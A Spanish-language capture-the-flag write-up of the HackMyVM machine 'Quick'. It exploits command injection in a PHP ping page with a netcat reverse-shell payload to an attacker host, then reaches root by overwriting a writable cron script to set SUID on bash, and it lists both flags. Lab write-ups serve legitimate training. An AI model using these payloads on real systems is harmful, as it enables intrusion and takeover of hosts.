---
title: "Quick - HackMyVM"
description: "Writeup de Quick, una máquina de HackMyVM enfocada en análisis de código y explotación web."
pubDate: 2024-10-28
platform: "hackmyvm"
category: "machines"
difficulty: "medium"
os: "linux"
language: es
tags: ["code-review", "command-injection", "cron"]
logo: "/images/writeups/hackmyvm/quick/logo.png"
heroImage: "/images/writeups/hackmyvm/quick/card.png"
retired: false
---

# Quick - HackMyVM Writeup

**Dificultad**: Medium  
**OS**: Linux  
**Plataforma**: HackMyVM

## Reconocimiento

```bash
nmap -sC -sV -p- 192.168.1.103
```

**Puertos abiertos:**
- 22/tcp (SSH - OpenSSH 8.9)
- 80/tcp (HTTP - Nginx 1.18)

## Enumeración Web

Encontramos una aplicación PHP que ejecuta comandos del sistema.

### Análisis de código

```php
<?php
$cmd = $_GET['cmd'];
system("ping -c 1 " . $cmd);
?>
```

Vulnerable a Command Injection.

## Explotación

```bash
curl "http://192.168.1.103/?cmd=127.0.0.1;nc+-e+/bin/bash+192.168.1.10+4444"
```

```bash
nc -lvnp 4444
```

Shell como `www-data`.

## Escalada de privilegios

Encontramos un script en `/opt/backup.sh` ejecutándose por cron como root.

```bash
cat /etc/crontab
```

Output: `*/5 * * * * root /opt/backup.sh`

El script es escribible por el grupo `www-data`:

```bash
ls -la /opt/backup.sh
-rwxrwxr-x 1 root www-data 85 Oct 28 10:00 /opt/backup.sh
```

Modificamos el script:

```bash
echo '#!/bin/bash' > /opt/backup.sh
echo 'chmod +s /bin/bash' >> /opt/backup.sh
```

Esperamos 5 minutos y ejecutamos:

```bash
/bin/bash -p
```

¡Shell como root!

## Banderas

- **User Flag**: `HMV{c0mm4nd_1nj3ct10n_1s_34sy}`
- **Root Flag**: `HMV{cr0n_j0bs_4r3_p0w3rful}`

## Conclusión

Buena máquina para practicar command injection y explotación de cron jobs.
